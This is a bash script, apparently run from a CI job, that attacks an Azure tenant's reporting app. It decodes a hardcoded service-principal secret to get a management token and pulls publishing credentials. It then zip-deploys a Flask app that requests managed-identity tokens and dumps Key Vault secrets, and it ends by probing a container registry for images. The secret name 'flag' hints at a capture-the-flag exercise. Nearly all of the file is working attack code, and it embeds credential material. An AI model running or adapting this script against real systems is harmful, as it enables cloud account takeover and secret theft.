#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG2="rg-tbl-reporting-prod-eus"

# Get OIDC token
OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | jq -r '.value')

# reporting-service SP token
RPT_ID="12ed54de-f2eb-4784-804c-3a7a3e83a9e9"
RPT_SEC=$(echo 'blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==' | base64 -d)
RPT_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$RPT_ID&client_secret=$RPT_SEC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== RPT_MGMT: ${#RPT_MGMT} ==="

APP="app-tbl-reporting-prod"
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$APP"

# ======= PART 1: Try to get publishing credentials =======
echo "=== publishing credentials ==="
curl -sS -X POST -H "Authorization: Bearer $RPT_MGMT" -H "Content-Type: application/json" -d '{}' \
  "$BASE/config/publishingcredentials/list?api-version=2023-01-01" | jq '{publishingUserName: .properties.publishingUserName, publishingPassword: .properties.publishingPassword, scmUri: .properties.scmUri}' 2>/dev/null

# ======= PART 2: Try to deploy a simple app via ZipDeploy =======
echo "=== Creating deploy package ==="
TMPDIR=$(mktemp -d)
# Create a simple Flask app that reads the MSI token
cat > "$TMPDIR/app.py" << 'APPEOF'
import os, json, urllib.request
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    return "ok"

@app.route("/msi")
def msi():
    results = {}
    # Try to get MSI token for vault
    identity_endpoint = os.environ.get("IDENTITY_ENDPOINT", "")
    identity_header = os.environ.get("IDENTITY_HEADER", "")
    msi_endpoint = os.environ.get("MSI_ENDPOINT", "")
    msi_secret = os.environ.get("MSI_SECRET", "")

    results["env"] = {
        "IDENTITY_ENDPOINT": identity_endpoint,
        "IDENTITY_HEADER": identity_header[:10] + "..." if identity_header else "",
        "MSI_ENDPOINT": msi_endpoint,
        "MSI_SECRET": msi_secret[:10] + "..." if msi_secret else "",
    }

    # Try vault scope
    for resource in ["https://vault.azure.net", "https://management.azure.com", "https://storage.azure.com"]:
        try:
            if identity_endpoint and identity_header:
                url = f"{identity_endpoint}?resource={resource}&api-version=2019-08-01"
                req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": identity_header})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    token_data = json.loads(resp.read())
                    results[resource] = {"access_token": token_data.get("access_token","")[:50]+"...", "expires_on": token_data.get("expires_on","")}
        except Exception as e:
            results[resource] = {"error": str(e)}

    # If we got a vault token, try to read KV2 secrets
    vault_token = None
    try:
        if identity_endpoint and identity_header:
            url = f"{identity_endpoint}?resource=https://vault.azure.net&api-version=2019-08-01"
            req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": identity_header})
            with urllib.request.urlopen(req, timeout=5) as resp:
                vault_token = json.loads(resp.read()).get("access_token","")
    except:
        pass

    if vault_token:
        try:
            req = urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",
                headers={"Authorization": f"Bearer {vault_token}"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                results["kv2_secrets"] = json.loads(resp.read())
        except urllib.request.HTTPError as e:
            results["kv2_secrets"] = {"error": f"HTTP {e.code}", "body": e.read().decode()[:500]}
        except Exception as e:
            results["kv2_secrets"] = {"error": str(e)}

        # Try reading specific secret names
        for secret_name in ["flag", "connection-string", "storage-key", "admin-password", "master-key", "secret"]:
            try:
                req = urllib.request.Request(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{secret_name}?api-version=7.4",
                    headers={"Authorization": f"Bearer {vault_token}"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    results[f"kv2_{secret_name}"] = json.loads(resp.read())
            except urllib.request.HTTPError as e:
                results[f"kv2_{secret_name}"] = {"error": f"HTTP {e.code}"}
            except Exception as e:
                results[f"kv2_{secret_name}"] = {"error": str(e)}

    # Also try KV1
    if vault_token:
        try:
            req = urllib.request.Request("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",
                headers={"Authorization": f"Bearer {vault_token}"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                results["kv1_secrets"] = json.loads(resp.read())
        except urllib.request.HTTPError as e:
            results["kv1_secrets"] = {"error": f"HTTP {e.code}"}
        except Exception as e:
            results["kv1_secrets"] = {"error": str(e)}

    return json.dumps(results, indent=2)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
APPEOF

cat > "$TMPDIR/requirements.txt" << 'REQEOF'
flask
gunicorn
REQEOF

cat > "$TMPDIR/startup.sh" << 'STARTEOF'
#!/bin/bash
pip install flask gunicorn
gunicorn --bind 0.0.0.0:8000 app:app
STARTEOF
chmod +x "$TMPDIR/startup.sh"

cd "$TMPDIR" && zip -r deploy.zip app.py requirements.txt startup.sh

# Get publishing creds first
echo "=== Getting SCM credentials ==="
PUBCREDS=$(curl -sS -X POST -H "Authorization: Bearer $RPT_MGMT" -H "Content-Type: application/json" -d '{}' \
  "$BASE/config/publishingcredentials/list?api-version=2023-01-01")
SCM_URI=$(echo "$PUBCREDS" | jq -r '.properties.scmUri // empty')
PUB_USER=$(echo "$PUBCREDS" | jq -r '.properties.publishingUserName // empty')
PUB_PASS=$(echo "$PUBCREDS" | jq -r '.properties.publishingPassword // empty')
echo "SCM_URI=$SCM_URI"
echo "PUB_USER=$PUB_USER"
echo "PUB_PASS length=${#PUB_PASS}"

if [ -n "$SCM_URI" ] && [ -n "$PUB_USER" ] && [ -n "$PUB_PASS" ]; then
  echo "=== Deploying via ZipDeploy ==="
  DEPLOY_RESP=$(curl -sS -X POST -u "$PUB_USER:$PUB_PASS" \
    --data-binary @deploy.zip \
    -H "Content-Type: application/zip" \
    "$SCM_URI/api/zipdeploy" -w "\nHTTP_CODE:%{http_code}" 2>&1)
  echo "Deploy response: $DEPLOY_RESP"

  # Set startup command
  echo "=== Setting startup command ==="
  curl -sS -X PUT -H "Authorization: Bearer $RPT_MGMT" -H "Content-Type: application/json" \
    "$BASE/config/web?api-version=2023-01-01" \
    -d '{"properties":{"appCommandLine":"gunicorn --bind 0.0.0.0:8000 app:app"}}' | jq '.properties.appCommandLine' 2>/dev/null

  # Wait for deployment
  echo "=== Waiting 30s for deployment ==="
  sleep 30

  # Try to access the MSI endpoint
  echo "=== Accessing /msi endpoint ==="
  curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/msi" 2>&1 | head -100
  curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1 | head -20
else
  echo "FAILED to get publishing credentials"
  echo "Full response: $(echo "$PUBCREDS" | jq '.' 2>/dev/null || echo "$PUBCREDS")"

  # Try alternative: use management API to deploy
  echo "=== Trying management API deploy ==="
  # Set app settings to point to our code
  curl -sS -X PUT -H "Authorization: Bearer $RPT_MGMT" -H "Content-Type: application/json" \
    "$BASE/config/appsettings?api-version=2023-01-01" \
    -d '{"properties":{"SCM_DO_BUILD_DURING_DEPLOYMENT":"true","WEBSITE_RUN_FROM_PACKAGE":"0"}}' | jq '.' 2>/dev/null | head -20

  # Try using Bearer token for SCM
  echo "=== Trying SCM with Bearer ==="
  curl -sS -X POST -H "Authorization: Bearer $RPT_MGMT" \
    --data-binary @deploy.zip \
    -H "Content-Type: application/zip" \
    "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/zipdeploy" -w "\nHTTP_CODE:%{http_code}" 2>&1 | head -20
fi

# ======= PART 3: Also try pulling the tebamoto-reporting-api image =======
echo "=== ACR: check tebamoto-reporting-api tags ==="
curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/tebamoto-reporting-api/tags/list" 2>/dev/null
echo ""
echo "=== ACR: check tebamoto-reporting-api manifest ==="
curl -sS -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  "https://crtblplatprodx3euoz.azurecr.io/v2/tebamoto-reporting-api/manifests/latest" 2>/dev/null | head -30

# Check other possible repo names
for REPO in storefront catalog-api tebamoto-storefront tebamoto-platform reporting-api; do
  echo "=== ACR tags: $REPO ==="
  curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/$REPO/tags/list" 2>/dev/null
done

echo "=== EXPLOIT COMPLETE ==="
